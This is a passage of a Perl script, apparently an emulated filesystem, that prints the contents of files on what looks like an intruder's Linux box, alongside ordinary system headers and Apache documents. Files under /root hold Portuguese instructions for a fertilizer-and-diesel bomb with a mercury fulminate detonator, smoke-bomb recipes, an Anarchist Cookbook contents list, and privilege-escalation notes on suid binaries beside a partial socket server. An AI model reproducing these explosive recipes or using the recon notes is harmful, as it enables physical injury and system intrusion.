	3:0x8129ecc:0x814b35d:[FALSE]
	4:0x8129ed4:0x814b363:[1271283623]
EOT
}

sub cat_242
{
   # /root/TODO
   print STDERR << "EOT"
01/01/2000 - ToDo List:

- Pegar os fontes de todos os programas listados no arquivo /root/suids
EOT
}

sub cat_243
{
   # /root/anarch2.txt
   print STDERR << "EOT"

 









                              DarkStorm's
                                 Book
                                  of
                         Compiled Articles on
                          Destruction, Crime,
                                 and
                          Other Illegal Acts












EOT
}

sub cat_244
{
   # /root/anarchy.htm
   print STDERR << "EOT"
<!-- X-URL: http://homepages.acenet.co.za/abjater/anarchy.htm -->
<!-- Date: Mon, 20 Nov 2000 03:24:33 GMT -->
<BASE HREF="http://homepages.acenet.co.za/abjater/anarchy.htm">

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>

<HEAD>
	<META NAME="GENERATOR" Content="Visual Page 1.0 for Windows">
	<META HTTP-EQUIV="Content-Type" CONTENT="text/html;CHARSET=iso-8859-1">
	<TITLE>|Abjater| - Anarchist Cookbook</TITLE>
</HEAD>

<BODY TEXT="#FFFFFF" BGCOLOR="#000000" VLINK="#0033FF">

<P ALIGN="CENTER">THE ANARCHIST COOKBOOK '97 By: The Jolly Roger et al<BR>
Merged/Converted/Edited/Revised to Clean Word '97 Document Form by Fing Joser</P>
<P ALIGN="CENTER"><IMG SRC="images/Danganim.gif" WIDTH="177" HEIGHT="31" ALIGN="BOTTOM" BORDER="0"></P>
<P ALIGN="CENTER"><BR>
<FONT COLOR="#FF0000">THIS MATERIAL IS FOR EDUCATIONAL PURPOSES ONLY! THE AUTHORS OF THIS WORK ASSUME NO RESPONSIBILITY
FOR YOUR ACTIONS!</FONT><BR>
<BR>
<BR>
[Table of Contents]<BR>
<A HREF="#Introduction by Fing Joser">Introduction by Fing Joser</A><FONT COLOR="#0000DD"><BR>
</FONT><A HREF="#Counterfeiting Money">Counterfeiting Money</A><FONT COLOR="#0000DD"><BR>
</FONT><A HREF="#Credit Card Fraud">Credit Card Fraud</A><FONT COLOR="#0000DD"><BR>
</FONT><A HREF="#Making Plastic Explosives from B">Making Plastic Explosives from Bleach</A><FONT COLOR="#0000DD"><BR>
</FONT><A HREF="#Picking Master Locks">Picking Master Locks</A><FONT COLOR="#0000DD"><BR>
</FONT><A HREF="#The Arts of Lockpicking I">The Arts of Lockpicking I</A><FONT COLOR="#0000DD"><BR>
EOT
}

sub cat_245
{
   # /root/bm.txt
   print STDERR << "EOT"
Good HPs

RooT66 - http://root66.nl.eu.org
ShellOracle - http://www.shelloracle.cjb.net
b0f - http://b0f.freebsd.lublin.pl
HardBeat - http://www.dataloss.net/
Cerberus - http://www.cerberus-infosec.co.uk
Henix - http://struck.8m.com
EOT
}

sub cat_246
{
   # /root/bombas
   print STDERR << "EOT"
Axur05 - http://www.axur05.org

Como fazer uma bomba de fertilizante
------------------------------------

Ingredientes:

- Jornal
- Fertilizante ( escolha o tipo quimico )
- Algodao
- Diesel ( combustivel )

Faca um montinho de jornal e coloque um pouco de fertilizante dentro.
Coloque algodao sobre ele e entao ensope o  algodao com o diesel.
Acenda e depois corra como voce nunca correu antes. A explosao e'
violenta portanto nao faca isso em ambiente fechados.


Detonador
---------

Caracteristicas:
- Explode a 180 graus celcius;
- Alto poder calorifico;
- Usado como detonador de bombas maiores.
 
Nome cientifico:
Fulminato de mercurio  (Hg[ONC] )
                               2
EOT
}

sub cat_247
{
   # /root/log
   print STDERR << "EOT"
read(0, "r", 1)                         = 1
write(1, "r", 1)                        = 1
read(0, "o", 1)                         = 1
write(1, "o", 1)                        = 1
read(0, "o", 1)                         = 1
write(1, "o", 1)                        = 1
read(0, "t", 1)                         = 1
write(1, "t", 1)                        = 1
read(0, "\r", 1)                        = 1
ioctl(0, TTY_DRIVER_MAGIC, {B38400 opost isig icanon echo ...}) = 0
write(1, "\n", 1)                       = 1
execve("/bin/login", ["/bin/login", "--", "root"], [/* 8 vars */]) = 0
brk(0)                                  = 0x8061860
mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40013000
open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat(3, {st_mode=0, st_size=0, ...})   = 0
mmap(0, 22274, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40014000
close(3)                                = 0
open("/lib/libcrypt.so.1", O_RDONLY)    = 3
fstat(3, {st_mode=0, st_size=0, ...})   = 0
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3"..., 4096) = 4096
mmap(0, 181340, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x4001a000
mprotect(0x4001f000, 160860, PROT_NONE) = 0
mmap(0x4001f000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x4000) = 0x4001f000
mmap(0x40020000, 156764, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x40020000
close(3)                                = 0
open("/lib/libc.so.6", O_RDONLY)        = 3
fstat(3, {st_mode=0, st_size=0, ...})   = 0
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3"..., 4096) = 4096
EOT
}

sub cat_248
{
   # /root/lynx_bookmarks.html
   print STDERR << "EOT"
<head>
<META http-equiv="content-type" content="text/html;charset=iso-8859-1">
<title>Bookmark file</title>
</head>
     You can delete links using the remove bookmark command.  It is usually
     the 'R' key but may have been remapped by you or your system
     administrator.<br>
     This file also may be edited with a standard text editor to delete
     outdated or invalid links, or to change their order.

<!--
Note: if you edit this file manually
      you should not change the format within the lines
      or add other HTML markup.
      Make sure any bookmark link is saved as a single line.
-->

<p>
<LI><a href="http://www.evirgula.com.br/mp3/download.asp?controle=1328">Anna Julia (mirror 1)</a>
<LI><a href="http://www.evirgula.com.br/mp3/download.asp?controle=1238">Ana J�lia</a>
<LI><a href="http://www.audiofind.com/los_hermanos.html">AudioFind - Los hermanos - Master Artist List</a>
<LI><a href="http://rulez.n3.net/new/(www.rulez.com.br)primavera.zip">[Los Hermanos]-Primavera</a>
<LI><a href="http://www.evirgula.com.br/mp3/download.asp?controle=1022">You Get What You Give</a>
<LI><a href="http://www.mp3central.com.br/linksmp3.html">Links para sites com Mp3</a>
<LI><a href="http://www.securityfocus.com/templates/tools-latest.html">tools</a>
<LI><a href="http://rootshell.com/beta/search.html">rootshell search</a>
<LI><a href="http://orbita.starmedia.com/~neumar2/letras/plegiaourbana.htm">Letras de m�sicas - Legi�o Urbana</a>
<LI><a href="http://www.evirgula.com.br/mp3/download.asp?controle=1328">Tucows DanOS</a>
<LI><a href="http://abordo.DanOS.tucows.com/index.html">Welcome to Tucows DanOS</a>
<LI><a href="http://www.onlinet.com.br/mp3/externo/mp3_internacionais.html">Musicas</a>
EOT
}

sub cat_249
{
   # /root/mbox
   print STDERR << "EOT"
From MAILER-DAEMON Thu Sep  7 09:26:26 2000
Date: 07 Sep 2000 09:26:26 -0300
From: Mail System Internal Data <MAILER-DAEMON\@ig.com.br>
Subject: DON'T DELETE THIS MESSAGE -- FOLDER INTERNAL DATA
Message-ID: <968329586\@ig.com.br>
X-IMAP: 0956803300 0000000079
Status: RO

This text is part of the internal format of your mail folder, and is not
a real message.  It is created automatically by the mail system software.
If deleted, important folder data will be lost, and it will be re-created
with the data reset to initial values.
EOT
}

sub cat_250
{
   # /root/minicom.log
   print STDERR << "EOT"
20001119 00:35:13 Quit without reset while online.
20001119 00:59:42 Quit without reset while online.
20001119 01:29:25 Quit without reset while online.
20001119 04:58:26 Hangup (0:00:40)
20001119 04:23:18 Quit without reset while online.
20001119 04:40:11 Quit without reset while online.
20001119 04:41:44 Quit without reset while online.
20001201 10:00:58 Hangup (0:00:28)
20001201 10:01:35 Quit without reset while online.
20001220 15:59:55 Quit without reset while online.
20001220 17:34:51 Quit without reset while online.
20001222 00:07:48 Quit without reset while online.
20001222 02:51:50 Quit without reset while online.
20001222 02:55:09 Quit without reset while online.
20001229 00:17:15 Quit without reset while online.
20001229 01:00:08 Quit without reset while online.
20001230 00:06:19 Quit without reset while online.
20001230 02:11:24 Quit without reset while online.
20010108 01:23:36 Quit without reset while online.
20010108 03:56:48 Quit without reset while online.
EOT
}

sub cat_251
{
   # /root/pop3.txt
   print STDERR << "EOT"
        _xXXXP^''                         ``^YXXXx_
     _xXXXXP~ ? - Protocolos Parte I - pop3   ~YXXXXx_
  _xXXXXXX(                                     )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                     )XXXXXXP~
     ~YXXXXb_             pcHazard            _dXXXXP~
        ~YXXXbx..                         ..xdXXXP~


                                  ----------
                                 | Prefacio |
                                  ----------


   Esta eh a primeira parte de uma serie de textos que escreverei
falando sobre diversos protocolos que costumamos usar no nosso
dia-a-dia. Inicialmente, pretendo falar sobre POP3, SMTP, FTP e
HTTP. Depois, se eu achar algum outro protocolo interessante eu os
passarei a voces. Se desejarem, enviem sugestoes sobre protocolos e seus
respectivos RFCs que eu irei ler e passar para a zine da forma mais clara
possivel. Com base nessas informacoes, o leitor que souber programar em
alguma linguagem como perl, C, delphi etc estara ateh apto a escrever seus
proprios clientes e servidores baseados nesses protocolos.

   Todos os textos serao retirados dos seus respectivos RFCs. Para quem
nao sabe, RFC significa Request for Comments, ou requerimento de
comentarios. Para cada tipo de protocolo existe pelo menos um RFC
falando sobre o seu funcionamento. Para alguns protocolos, existem varios
RFCs novos a medida que vao sendo atualizados. Outros RFCs podem ser
EOT
}

sub cat_252
{
   # /root/smoke.html
   print STDERR << "EOT"
<!-- X-URL: http://members.spree.com/education/kickass4/Smoke.html -->
<!-- Date: Mon, 20 Nov 2000 02:37:18 GMT -->
<BASE HREF="http://members.spree.com/education/kickass4/Smoke.html">

<html>
<head>
<title>Smoke Bombs.</title> 
</head>
<body Bgcolor="black">

<!--Spree.com Ad Starts Here-->
<script language="JavaScript">
<!--
stats = "toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,width=490,height=60"
SpreeMsgWindow = window.open("/sg/AdsPopUpWindow.asp?murl="+window.location,"AdWindow",stats)
// -->
</script>
<!--Spree.com Ad Ends Here-->

<br>
<center><font size=10><font color="white"><i><b><u>Smoke Bombs.</u></font></font></i></b>
<br><br><br>
<center><font color="white"><font size=4><b>
<u>Here is the recipe for one helluva smoke bomb!</u>
<br><br>
4 parts sugar<br>
6 parts potassium nitrate (Salt Peter)
<br><br>
Heat this mixture over a LOW flame until it melts, stirring well. 
Pour it into a future container and, before it solidifies, imbed a 
EOT
}

sub cat_253
{
   # /root/smoke2.html
   print STDERR << "EOT"
<!-- X-URL: http://sciencenet.oit.net/database/Technology/9609/t00163d.html -->
<!-- Date: Mon, 20 Nov 2000 02:55:34 GMT -->
<BASE HREF="http://sciencenet.oit.net/database/Technology/9609/t00163d.html">

<!doctype html public="-//W3C//DTD" html 3="2//EN">
<html>

	<head>
		<title>ScienceNet - How do you make a smoke bomb?</title>
		<meta name="GENERATOR" content="User-Agent: Mozilla/3.01Gold (Macintosh; I; PPC)">
		<meta name="Author" content="Duncan Franklin">
	</head>

	<body background="../TechImages/TECHBACKBLANK.GIF">
		<p><img src="../TechImages/TECHICON.GIF" alt="Technology" height="87" width="72" align="BOTTOM"><img src="../TechImages/TECHNOLOGY.GIF" alt="Technology" hspace="15" height="33" width="369" align="BOTTOM"></p>
		<p><img src="../TechImages/TECHDIVIDER.GIF" alt="-" height="2" width="600"></p>
		<table width="600">
			<tr>
				<td width="90"><br>
				</td>
				<td width="510">
					<h2>How do you make a smoke bomb?</h2>
					<p><font size="+1">Well, this depends on what you mean by a smoke bomb. The smoke they use in theatres is known as dry ice. Dry ice is solid carbon dioxide, that's usually a gas at room temperature. You keep it solid by keeping it cold until you need it, then when you put it on stage at room temperature, it turns into a gas very quickly and causes a smoke effect. </font></p>
					<p><font size="+1">Smoke bombs are also going to be used to stop car thieves. When a thief breaks into a car, they trigger a pump which fills a metal coil with a mixture of two chemicals - propylene glycol and glycerine - and then heats them up. This makes the chemicals vaporise and fill the car with a dense smoke that the thief can't see through. </font></p>
					<p><font size="+1">The smoke bombs that the police and army use to stop rioters use phosphorus which can be a very dangerous chemical. </font></p>
				</td>
			</tr>
		</table>
		<p><img src="../TechImages/TECHDIVIDER.GIF" alt="-" height="2" width="600"></p>
		<table width="600">
EOT
}

sub cat_254
{
   # /root/smoke3.html
   print STDERR << "EOT"
<!-- X-URL: http://library.thinkquest.org/3310/user/experiments/441.html -->
<!-- Date: Mon, 20 Nov 2000 03:04:24 GMT -->
<BASE HREF="http://library.thinkquest.org/3310/user/experiments/441.html">

<html>
  <head>
    <title>what is and where you can get potasium nitate.</title>
  </head>
  <body>
    <center>
      <h1>what is and where you can get potasium nitate.</h1>
    </center>
<hr size=7 width=75%>
<center>[ <a href="#followups">Follow Ups</a> ] [ <a href="#postfp">Post Followup</a> ] [ <a href="../user/exper.html">Chem101 Experiments Newsgroup</a> ] [ <a href="../user/faq.html">FAQ</a> ]</center>
<hr size=7 width=75%><p>
Posted by sniper1 on September 18, 1999 at 06:47:04:<p>
In Reply to: <a href="195.html">how to make a smoke bomb .....a fun experiment</a> posted by TheanarchesT on April 13, 1999 at 19:06:53:<p>
: 2 parts sugar to 3 parts potasium nitrate<br>: heat on low heat ( in a disposeable tin can )until the mixture has melted<br>: once it has hardened drop a small amount of alcohal on it and ignite it<p>: <br>: this has potential to make lots of smoke.<p>: <br>: curticy of<br>: TheanarchesT<p>potasium nitrate is most commanly known as salt peter. Any hardware store will have it.
<br>
<br><hr size=7 width=75%><p>
<a name="followups">Follow Ups:</a><br>
<ul><!--insert: 441-->
<!--top: 500--><li><a href="500.html">hmm</a> <b>mAx</b> <i>04:15:26 10/25/99</i>
(<!--responses: 500-->3)
<ul><!--insert: 500-->
<!--top: 761--><li><a href="761.html">kinda</a> <b>bob</b> <i>05:39:17 12/14/99</i>
(<!--responses: 761-->2)
<ul><!--insert: 761-->
<!--top: 3381--><li><a href="3381.html">potasium nitrate</a> <b>chris jhonson</b> <i>01:26:36 6/26/100</i>
(<!--responses: 3381-->1)
EOT
}

sub cat_255
{
   # /root/suids
   print STDERR << "EOT"
/usr/bin/at
/usr/bin/crontab
/usr/bin/disable-paste
/usr/bin/fdmount
/usr/bin/lpq
/usr/bin/lpr
/usr/bin/lprm
/usr/bin/man
/usr/bin/minicom
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/expiry
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/wall
/usr/bin/write
/usr/bin/suidperl5.00503
/usr/bin/glines
/usr/bin/gnibbles
/usr/bin/gnobots2
/usr/bin/gnome-stones
/usr/bin/gnome-xbill
/usr/bin/gnometris
/usr/bin/gnomine
/usr/bin/gnotravex
/usr/bin/gtali
/usr/bin/gturing
/usr/bin/iagno
EOT
}

sub cat_256
{
   # /root/teste.pl
   print STDERR << "EOT"
#!/usr/bin/perl -Tw

use strict;
#BEGIN
{
   \$ENV{PATH} = '/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/X11R6/bin:/usr/openwin/bin:/usr/games:/opt/kde/bin';
   \$ENV{PS1} = '\\h:\\w\\\\$ ';
}
use Socket;
use Carp;
my \$EOL = "\015\012";

sub spawn;  # forward declaration
sub logmsg { print "\$0 \$\$: \@_ at ", scalar localtime, "\n" }

my \$port = shift || 2345;
my \$proto   = getprotobyname('tcp');
\$port = \$1 if \$port =~ /(\d+)/; # untaint port number

socket(Server, PF_INET, SOCK_STREAM, \$proto)        || die
"socket: \$!";
setsockopt(Server, SOL_SOCKET, SO_REUSEADDR,
                                               pack("l", 1))   || die "setsockopt: \$!";
bind(Server, sockaddr_in(\$port, INADDR_ANY))        || die "bind: \$!";
listen(Server,SOMAXCONN)                            || die "listen: \$!";
logmsg "server started on port \$port";

my \$waitedpid = 0;
my \$paddr;
EOT
}

sub cat_257
{
   # /root/trace
   print STDERR << "EOT"
execve("/usr/bin/cdplay", ["cdplay", "play", "5"], [/* 30 vars */]) = 0
brk(0)                                  = 0x8050fd8
mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40013000
open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 4
fstat(4, {st_mode=0, st_size=0, ...})   = 0
mmap(0, 22274, PROT_READ, MAP_PRIVATE, 4, 0) = 0x40014000
close(4)                                = 0
open("/lib/i686/mmx/libncurses.so.4", O_RDONLY) = -1 ENOENT (No such file or directory)
stat("/lib/i686/mmx", 0xbffff44c)       = -1 ENOENT (No such file or directory)
open("/lib/i686/libncurses.so.4", O_RDONLY) = -1 ENOENT (No such file or directory)
stat("/lib/i686", 0xbffff44c)           = -1 ENOENT (No such file or directory)
open("/lib/mmx/libncurses.so.4", O_RDONLY) = -1 ENOENT (No such file or directory)
stat("/lib/mmx", 0xbffff44c)            = -1 ENOENT (No such file or directory)
open("/lib/libncurses.so.4", O_RDONLY)  = 4
fstat(4, {st_mode=0, st_size=0, ...})   = 0
read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3"..., 4096) = 4096
mmap(0, 248812, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x4001a000
mprotect(0x4004b000, 48108, PROT_NONE)  = 0
mmap(0x4004b000, 32768, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0x30000) = 0x4004b000
mmap(0x40053000, 15340, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x40053000
close(4)                                = 0
open("/lib/libc.so.6", O_RDONLY)        = 4
fstat(4, {st_mode=0, st_size=0, ...})   = 0
read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3"..., 4096) = 4096
mmap(0, 949788, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x40057000
mprotect(0x40138000, 28188, PROT_NONE)  = 0
mmap(0x40138000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 4, 0xe0000) = 0x40138000
mmap(0x4013c000, 11804, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x4013c000
close(4)                                = 0
EOT
}

sub cat_258
{
   # /root/txt.txt
   print STDERR << "EOT"
Nao ha poder sem conhecimento
Mais vale uma shell remota na mao do que duas locais voando
EOT
}

sub cat_259
{
   # /root/url
   print STDERR << "EOT"
roothat.labs.pulltheplug.com
mainsource.labs.pulltheplug.com
EOT
}

sub cat_260
{
   # /usr/include/a.out.h
   print STDERR << "EOT"
#ifdef _LIBC
# include_next <DanOS/a.out.h>
#else
# include <DanOS/a.out.h>
#endif
EOT
}

sub cat_261
{
   # /usr/include/aalib.h
   print STDERR << "EOT"
#ifndef __AALIB_INCLUDED__
#define __AALIB_INCLUDED__
#include <stdio.h>
#ifdef __cplusplus
extern "C" {
#endif
#define AA_LIB_VERSION 1
#define AA_LIB_MINNOR 2
#define AA_LIB_VERSIONCODE 102000

#define AA_NATTRS 5
#define AA_NPARAMS 5

#define AA_NONE 0		/*special keycodes */
#define AA_RESIZE 258
#define AA_MOUSE 259
#define AA_UP 300
#define AA_DOWN 301
#define AA_LEFT 302
#define AA_RIGHT 303
#define AA_BACKSPACE 304
#define AA_ESC 305
#define AA_UNKNOWN 400
#define AA_RELEASE 65536


#define AA_NORMAL_MASK 1	/*masks for attributes */
#define AA_DIM_MASK 2
#define AA_BOLD_MASK 4
#define AA_BOLDFONT_MASK 8
EOT
}

sub cat_262
{
   # /usr/include/assert.h
   print STDERR << "EOT"
/* Copyright (C) 1991,92,94,95,96,97,98,99 Free Software Foundation, Inc.
   This file is part of the GNU C Library.

   The GNU C Library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Library General Public License as
   published by the Free Software Foundation; either version 2 of the
   License, or (at your option) any later version.

   The GNU C Library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Library General Public License for more details.

   You should have received a copy of the GNU Library General Public
   License along with the GNU C Library; see the file COPYING.LIB.  If not,
   write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330,
   Boston, MA 02111-1307, USA.  */

/*
 *	ISO C Standard: 4.2 DIAGNOSTICS	<assert.h>
 */

#ifdef	_ASSERT_H

# undef	_ASSERT_H
# undef	assert

# ifdef	__USE_GNU
#  undef assert_perror
# endif
EOT
}

sub cat_263
{
   # /usr/man/Makefile
   print STDERR << "EOT"
# Do "make screen" first, if you want to protect already installed,
# more up-to-date manual pages than the ones included in this package.
# Do "make install" to copy the pages to their destination.
# Do "make gz" or "make bz2" first if you use compressed source pages.

# FHS requires /usr/share/man
MANDIR=/usr/man

GZIP=gzip -9
BZIP2=bzip2 -9

all: screen remove install

allgz: gz all

allbz: bz2 all

# Unfortunately, due to BSD brain damage codified by POSIX,
# code like "for i in dir/*; do STH; done" does not loop over
# all files in dir - indeed, when dir is empty it does STH
# once instead of zero times. David Balazic found that he
# lost his files and noticed the cause.
# [If we knew for sure this was using bash, we could set
#  allow_null_glob_expansion.]

screen:
	-mkdir not_installed
	files=man?/*; \
	if [ "\$\$files" != "man?/*" ]; then for i in \$\$files; do \
		if [ \$(MANDIR)/\$\$i -nt \$\$i ]; then \
EOT
}

sub cat_264
{
   # /usr/man/whatis
   print STDERR << "EOT"
/etc/auto.master (5) - Master Map for automounter
/etc/init.d/autofs (8) - Control Script for automounter
/etc/login.defs (5)  - Login configuration
/var/yp/nicknames (5) - nickname translation table for NIS maps
Compound (n)         - Create multi-line compound images.
DEVINFO (5)          - device entry database
Dislocate (1)        - disconnect and reconnect processes
GDBM (3)             - The GNU database manager. Includes dbm and ndbm compatability. (Version .)
GNU as (1)           - the portable GNU assembler.
GPC (3)              - GTK Plug-in Convenience library
Gimp (1)             - an image manipulation and paint program.
Http (n)             - Client-side implementation of the HTTP/1.0 protocol.
IMAPd (8c)           - Internet Message Access Protocol server
IPOPd (8c)           - Post Office Protocol server
MAKEDEV (8)          - create and maintain filesystem device entries
MAKEDEV (8)          - create devices
MAKEDEV.cfg (5)      - configuration for MAKEDEV(8)
MAKEFLOPPIES (1)     - Creates the default floppy device nodes. '" t TQ \$1 ..
MIME (1)             - Multipurpose Internet Mail Extensions
NcFTP (1)            - Internet file transfer program
Netwatch (1)         - Ethernet Internet Protocol Monitor
Pnews (1)            - a program for posting news articles
QAccel (3qt)         - Handles keyboard accelerator keys
QApplication (3qt)   - Manages the application event queue
QArray (3qt)         - Template class that provides arrays of simple types
QAsyncIO (3qt)       - Encapsulates I/O asynchronicity
QBitArray (3qt)      - Array of bits
QBitVal (3qt)        - Internal class, used with QBitArray
QBitmap (3qt)        - Monochrome (1 bit depth) pixmaps
QBoxLayout (3qt)     - Lines up child widgets horizontally or vertically
EOT
}

sub cat_265
{
   # /var/lib/apache/ABOUT_APACHE
   print STDERR << "EOT"

                     The Apache HTTP Server Project

                         http://www.apache.org/

                              February 1999

The Apache Project is a collaborative software development effort aimed
at creating a robust, commercial-grade, featureful, and freely-available
source code implementation of an HTTP (Web) server.  The project is
jointly managed by a group of volunteers located around the world, using
the Internet and the Web to communicate, plan, and develop the server and
its related documentation.  These volunteers are known as the Apache Group.
In addition, hundreds of users have contributed ideas, code, and
documentation to the project.  This file is intended to briefly describe
the history of the Apache Group, recognize the many contributors, and
explain how you can join the fun too.

In February of 1995, the most popular server software on the Web was the
public domain HTTP daemon developed by Rob McCool at the National Center
for Supercomputing Applications, University of Illinois, Urbana-Champaign.
However, development of that httpd had stalled after Rob left NCSA in
mid-1994, and many webmasters had developed their own extensions and bug
fixes that were in need of a common distribution.  A small group of these
webmasters, contacted via private e-mail, gathered together for the purpose
of coordinating their changes (in the form of "patches").  Brian Behlendorf
and Cliff Skolnick put together a mailing list, shared information space,
and logins for the core developers on a machine in the California Bay Area,
with bandwidth and diskspace donated by HotWired and Organic Online.
By the end of February, eight core contributors formed the foundation
EOT
}

sub cat_266
{
   # /var/lib/apache/Announcement
   print STDERR << "EOT"
Apache 1.3.6 Released
=====================

The Apache Group is pleased to announce the release of version
1.3.6 of the Apache HTTP server.

This new Apache version incorporates over 60 significant improvements
to the server.  Apart from portability and security fixes, documentation
enhancements, performance improvements, and assorted other minor
features or fixes notable changes are:

 - mod_log_config now supports conditional logging based upon
   environment variables and support for multiline entries.

 - New CustomLog directive %V: This logs the hostname according to the
   UseCanonicalName setting (this is the pre-1.3.4 behaviour of %v).

 - Enhanced mod_rewrite's mapfile handling: The in-core cache for text
   and DBM format mapfiles now uses a hash table with LRU functionality.
   Furthermore map lookups for non-existent keys are now cached as well.
   The changes drastically improve the performance when large rewrite
   maps are in use.

 - Ability to handle DES or MD5 authentication passwords.
 
 - New <LimitExcept> directive to allow the user to assign authentication
   control to any HTTP method that is *not* given in the argument list;
   i.e., the logical negation of the <Limit> directive.
 
 - Improved content negotiation.
EOT
}

sub cat_267
{
   # /var/lib/apache/INSTALL
   print STDERR << "EOT"

  APACHE INSTALLATION

  NOTE: Windows users please read the documents README.NT and
        http://www.apache.org/docs/windows.html, (or the
        htdocs/manual/windows.html file included with Apache). 
        The following applies only to Unix users.

  Introduction
  ============

  Like all good things, there are two ways to configure, compile, and install
  Apache.  You can go for the 3-minute installation process using the APACI
  process described below; or, you can opt for the same mechanism used in
  previous versions of Apache, as described in the file 'src/INSTALL'.  Each
  mechanism has its benefits and drawbacks - APACI is newer and a little more
  raw, but it gets you up and running the least amount of time, whereas the
  "Configuration.tmpl" mechanism may be more familiar and give you some more
  flexibility to the power user.  We'd be very interested in your comments and
  feedback regarding each approach.


  Installing the Apache 1.3 HTTP server with APACI
  ================================================

  1. Overview for the impatient
     --------------------------

     \$ ./configure --prefix=PREFIX
     \$ make
EOT
}

sub cat_268
{
   # /var/lib/apache/KEYS
   print STDERR << "EOT"
This file contains the PGP keys of various Apache developers.
Please don't use them for email unless you have to. Their main
purpose is code signing.

Apache users: pgp < KEYS
Apache developers: pgp -kxa <your name> and append it to this file.


Type Bits/KeyID    Date       User ID
pub  1024/2719AF35 1995/05/13 Ben Laurie <ben\@algroup.co.uk>
                              Ben Laurie <ben\@gonzo.ben.algroup.co.uk>

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3ia

mQCNAi+0jQEAAAEEAK7oX0FeNncaHfa1v+V7SMUviAm8qB8orWG0zvja4ZtSrHVg
/PMwppUh44t5ERA9lltRBdHu30+YSh8a1dYt1XOD83nknzj9rhtpFAPqyywlLVhN
VY3PVLyMbULw27aEAGc+StFqrDoUQ0+j9QU/YH/IyVN9rBaJyhsIDEUnGa81AAUR
tB5CZW4gTGF1cmllIDxiZW5AYWxncm91cC5jby51az6JARUDBRAyb2Doc3AsNzyk
Yh0BARa6CACUBnsP9Vb+T/PvNYKVQBIODz+90tz5GozWwCVfPVSaRd8Dz+oF1sFs
YCz/KuxqBhL5PkiCuSMfOVlPA5nirjoktMF/af5saZqhPr5rvr67Z1OzZnVDvWe4
DhFrn8EoLrY5YNJhUwfINnZqyKaQu8TW6p4caLkTCW0KM+4ztTe74xRG9NeE+K0+
0RMpAF3jEY36LGRjq6miazt2bVZQDTl6CuWE+gAaFlX2ojV7e1xdxVvpBIEc34MP
g9ORJ0evx1QilMt1VyGcS/pe4IQgjdJqjU/4fzqFZkT2nntQMbV9kQyNe2+qfqP7
giTryIanmBAfd3oOCTsRz2VKPfdhCqCRiQB1AwUQMRdzEEyr2GZv4ALJAQEuhAL6
A8I84BR+87uNAHD0ZJkTM73WdyMEGvAKBvrZK/g0VLYj0NtgkSuRJfrXnGkuh27I
ZrjfL952Q/mXgMtHhJHJ9YfenGFWSEDHnolNzKOzTQJpE01IZ3nWv7ezA9N1LZVC
iQCVAgUQMROrdRsIDEUnGa81AQEUNgQAlvyjt534RDQd2AYGoZriaFzjaL7dTCRH
4b1zxuWBNWf3pI4W0iwU02Q5rEWEmY5DLl6/ie+vcQKOWSqXVgnM/s6EARdKEN56
d6PzkwszgfEybDYrcAxReJcTCcV8ItJer/iqpBLgtaxyUpI77NvKcDGHp6BgYpnv
EOT
}

sub cat_269
{
   # /var/lib/apache/LICENSE
   print STDERR << "EOT"
/* ====================================================================
 * Copyright (c) 1995-1999 The Apache Group.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer. 
 *
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the documentation and/or other materials provided with the
 *    distribution.
 *
 * 3. All advertising materials mentioning features or use of this
 *    software must display the following acknowledgment:
 *    "This product includes software developed by the Apache Group
 *    for use in the Apache HTTP server project (http://www.apache.org/)."
 *
 * 4. The names "Apache Server" and "Apache Group" must not be used to
 *    endorse or promote products derived from this software without
 *    prior written permission. For written permission, please contact
 *    apache\@apache.org.
 *
 * 5. Products derived from this software may not be called "Apache"
 *    nor may "Apache" appear in their names without prior written
 *    permission of the Apache Group.
 *
 * 6. Redistributions of any form whatsoever must retain the following
EOT
}

sub cat_270
{
